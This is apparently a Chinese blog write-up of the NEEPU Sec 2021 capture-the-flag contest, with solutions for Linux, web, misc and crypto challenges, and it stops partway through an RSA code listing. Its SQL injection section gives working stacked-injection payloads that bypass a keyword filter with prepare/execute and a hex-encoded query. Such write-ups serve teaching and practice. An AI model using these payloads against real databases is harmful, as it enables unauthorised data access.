<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>NEEPU Sec 2021公开赛 | Lazzaro</title><meta name="description" content="​     东北电力大学校赛，Web综合程度高，Crypto太少了。 Rank: 3  NoobLinux入门 Linux基本指令 ls&#x2F;dir: 访问当前目录 cat: 获取当前文件内容 grep: 匹配字符串 *: 匹配一个或多个字符 ?: 匹配一个字符 &#x2F;: 根目录 hint: Linux的系统配置文件主要放在哪里?  Linux命令大考察。 ls -al 当前目录发现 hint.txt c"><meta property="og:type" content="article"><meta property="og:title" content="NEEPU Sec 2021公开赛"><meta property="og:url" content="https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="​     东北电力大学校赛，Web综合程度高，Crypto太少了。 Rank: 3  NoobLinux入门 Linux基本指令 ls&#x2F;dir: 访问当前目录 cat: 获取当前文件内容 grep: 匹配字符串 *: 匹配一个或多个字符 ?: 匹配一个字符 &#x2F;: 根目录 hint: Linux的系统配置文件主要放在哪里?  Linux命令大考察。 ls -al 当前目录发现 hint.txt c"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/image-20210524204117861.png"><meta property="og:image" content="https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/image-20210525013200068.png"><meta property="article:published_time" content="2021-05-24T11:40:39.000Z"><meta property="article:modified_time" content="2021-05-24T17:48:45.003Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2021赛"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/image-20210524204117861.png"><link rel="canonical" href="https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF弱鸡自进阶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">总览</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">汇总</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">类别</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">关键词</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">来留个言 👉👉👉</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">类别</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">50</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">关键词云</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020赛</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021赛</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022赛</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023赛</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.29px">2024赛</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13px">2025赛</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">反编译</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">反调试</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">取证</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">后量子密码</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">命令行</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">图像</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">块密码</a> <a href="/tags/%E5%A0%86/" style="font-size:13px">堆</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">密码</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">文件上传</a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">曲线</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">格密码</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">注入</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">流密码</a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">流量</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">混淆</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">渗透</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">离散对数</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">算法</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">绕过</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">编码</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">脚本</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">自动化</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">逃逸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">隐写</a></div></div><div class="widget"><h3 class="widget-title">汇总</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">十二月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Noob"><span class="toc-number">1.</span> <span class="toc-text">Noob</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%85%A5%E9%97%A8"><span class="toc-number">1.1.</span> <span class="toc-text">Linux入门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%BC%BA%E5%A4%A7%E8%84%91"><span class="toc-number">1.2.</span> <span class="toc-text">最强大脑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E4%BE%BF%E6%B3%A82-0"><span class="toc-number">1.3.</span> <span class="toc-text">随便注2.0</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#remote-table"><span class="toc-number">2.1.</span> <span class="toc-text">remote_table</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LOVE-DEATH-amp-ROBOTS"><span class="toc-number">2.2.</span> <span class="toc-text">LOVE_DEATH&amp;ROBOTS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#15-Puzzle"><span class="toc-number">3.1.</span> <span class="toc-text">15 Puzzle!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BE%99%E4%BC%9A%E8%AF%B4%E8%AF%9D%EF%BC%9F"><span class="toc-number">3.2.</span> <span class="toc-text">龙会说话？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA"><span class="toc-number">4.1.</span> <span class="toc-text">RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AES"><span class="toc-number">4.2.</span> <span class="toc-text">AES</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-number">5.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OLLEH"><span class="toc-number">5.1.</span> <span class="toc-text">OLLEH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-re"><span class="toc-number">5.2.</span> <span class="toc-text">ez_re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#login"><span class="toc-number">5.3.</span> <span class="toc-text">login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ppap"><span class="toc-number">5.4.</span> <span class="toc-text">ppap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez"><span class="toc-number">5.5.</span> <span class="toc-text">ez</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">6.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ncc"><span class="toc-number">6.1.</span> <span class="toc-text">ncc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-shellcode"><span class="toc-number">6.2.</span> <span class="toc-text">easy_shellcode</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-NEEPU-Sec-2021公开赛" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">NEEPU Sec 2021公开赛</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/" class="article-date"><time datetime="2021-05-24T11:40:39.000Z" itemprop="datePublished">2021-05-24</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2021%E8%B5%9B/" rel="tag">2021赛</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/" class="leancloud_visitors" data-flag-title="NEEPU Sec 2021公开赛"><span class="leancloud-visitors-count">∞</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>​</p><p>东北电力大学校赛，Web综合程度高，Crypto太少了。</p><p>Rank: 3</p><hr><h2 id="Noob"><a href="#Noob" class="headerlink" title="Noob"></a>Noob</h2><h3 id="Linux入门"><a href="#Linux入门" class="headerlink" title="Linux入门"></a>Linux入门</h3><blockquote><p>Linux基本指令</p><p>ls/dir: 访问当前目录</p><p>cat: 获取当前文件内容</p><p>grep: 匹配字符串</p><p>*: 匹配一个或多个字符</p><p>?: 匹配一个字符</p><p>/: 根目录</p><p>hint: Linux的系统配置文件主要放在哪里?</p></blockquote><p>Linux命令大考察。</p><p><code>ls -al</code> 当前目录发现 <code>hint.txt</code></p><p><code>cat hint.txt</code> 查看内容：<code>尝试访问根目录</code></p><p><code>ls -al /</code> 根目录发现<code>flag</code>文件</p><p><code>cat /flag</code> 查看内容：<code>可以尝试grep</code></p><p>在根目录逐个文件夹用<code>grep</code>命令试，在<code>/etc</code>下发现关键字：</p><p><code>grep -r -n &quot;Neepu&#123;&quot; /etc</code></p><p>结果：</p><p><code>/etc/neepu.conf:1:Neepu&#123;f782fecc-2e63-4819-8dd4-f2b2584c85b0&#125;</code></p><p>​</p><h3 id="最强大脑"><a href="#最强大脑" class="headerlink" title="最强大脑"></a>最强大脑</h3><blockquote><p>不会吧，不会吧，不会有人不喜欢算算术吧…</p></blockquote><p>10s限时算数题，利用python里的requests包处理就好：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://neepusec.club:18495/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">r = s.get(url)</span><br><span class="line">html = r.text</span><br><span class="line">start = html.index(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="built_in">len</span>(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="number">8</span></span><br><span class="line">end = start+html[start:].index(<span class="string">&#x27;&amp;nbsp=&amp;nbsp?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	cal = html[start:end].replace(<span class="string">&#x27;&amp;nbsp&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	r = s.post(url,data=&#123;<span class="string">&#x27;answer&#x27;</span>:<span class="built_in">str</span>(<span class="built_in">eval</span>(cal))&#125;)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="built_in">print</span>((i+<span class="number">1</span>,<span class="string">&#x27;success&#x27;</span>))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;Neepu&#123;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="built_in">print</span>(i+<span class="number">1</span>)</span><br><span class="line">		<span class="built_in">print</span>(r.text)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	html = r.text</span><br><span class="line">	start = html.index(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="built_in">len</span>(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="number">8</span></span><br><span class="line">	end = start+html[start:].index(<span class="string">&#x27;&amp;nbsp=&amp;nbsp?&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​</p><h3 id="随便注2-0"><a href="#随便注2-0" class="headerlink" title="随便注2.0"></a>随便注2.0</h3><blockquote><p>如果我告诉你网上有原题，你能做的出来吗?</p><p>百度/谷歌搜索: [强网杯 2019]随便注</p></blockquote><p>强网杯2019 随便注原题魔改，堆叠注入，照着来。</p><p><code>1&#39; union select 1,2,database()#</code> 得到过滤规则 <code>return preg_match(&quot;/select|update|delete|drop|insert|where|rename|set|handler|char|\*| | |\./i&quot;,$inject);</code></p><p>空格用<code>%0a</code>代替，尝试堆叠注入：</p><p><code>0&#39;;show%0adatabases;#</code> 得到数据库名：ctftraining, information_schema, mysql, performance_schema, supersqli, test</p><p><code>0&#39;;show%0atables;#</code> 得到表名：@Neepu2021招新赛, words</p><p><code>0&#39;;desc%0a`@Neepu2021招新赛`;#</code> 得到列名：flag, NO</p><p>原题有<strong>重命名法</strong>和<strong>预处理法</strong>可得flag，这里<code>rename</code>和<code>set</code>被禁，可用<strong><code>prepare</code> 预处理+<code>execute</code> 执行</strong>的方法，构造<code>select flag from `@Neepu2021招新赛`</code>16进制字符串，代入预处理语句拿flag：</p><p><code>1&#39;;prepare%0axxx%0afrom%0a0x73656c65637420666c61672066726f6d2060404e6565707532303231e68b9be696b0e8b59b60;execute%0axxx;#</code></p><p>​</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h3><blockquote><p>这真的是远程桌面吗?或许吧…</p></blockquote><p>翻一圈源码，在<code>notfound.html</code>找到flag。</p><p>​</p><h3 id="LOVE-DEATH-amp-ROBOTS"><a href="#LOVE-DEATH-amp-ROBOTS" class="headerlink" title="LOVE_DEATH&amp;ROBOTS"></a>LOVE_DEATH&amp;ROBOTS</h3><blockquote><p>Beauty and danger coexist, and the magnificence, weirdness, and extraordinary view of the world often lie in peril, and human beings are rare, so people who do not have aspirations cannot come.</p></blockquote><p>根据标题ROBOTS，容易想到<code>robots.txt</code>，访问发现<code>/n33pvfl4g.php</code>，再访问<code>n33pvfl4g.php</code>得flag。</p><p>​</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="15-Puzzle"><a href="#15-Puzzle" class="headerlink" title="15 Puzzle!"></a>15 Puzzle!</h3><blockquote><p>You can do it!</p></blockquote><p>手拼就是了，拼完有flag。</p><p>​</p><h3 id="龙会说话？"><a href="#龙会说话？" class="headerlink" title="龙会说话？"></a>龙会说话？</h3><blockquote><p>龙会聊天吗？</p></blockquote><p>第一层，一个文件 dragon 和一个加密压缩包 dragon’s talk.rar。</p><p>010editor查看 dragon，发现尾部<code>49454E44AE426082</code>是png文件尾，查找文件头<code>89504E47</code>，分离出png图片：</p><p><img src="/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/image-20210524204117861.png" alt="image-20210524204117861"></p><p>找到<a target="_blank" rel="noopener" href="https://www.dcode.fr/draconic-dragon-language">龙语解码工具</a>，解出<code>youseethedragon</code>为rar密码。</p><p>第二层，一个 dragon’s talk.wav 文件。</p><p>用audacity未发现什么信息，尝试LSB隐写，用<a target="_blank" rel="noopener" href="https://silenteye.v1kings.io/">Silenteye</a>无密码得到隐藏文件flag.txt。</p><p>​</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>Just RSA!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span> (p1,p2,e):</span><br><span class="line">    not_hint = (p1 + <span class="number">1</span>) * (p2 + <span class="number">1</span>)</span><br><span class="line">    S = gmpy2.invert(e, not_hint)</span><br><span class="line">    not_p = S%(p1+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> not_p</span><br><span class="line"></span><br><span 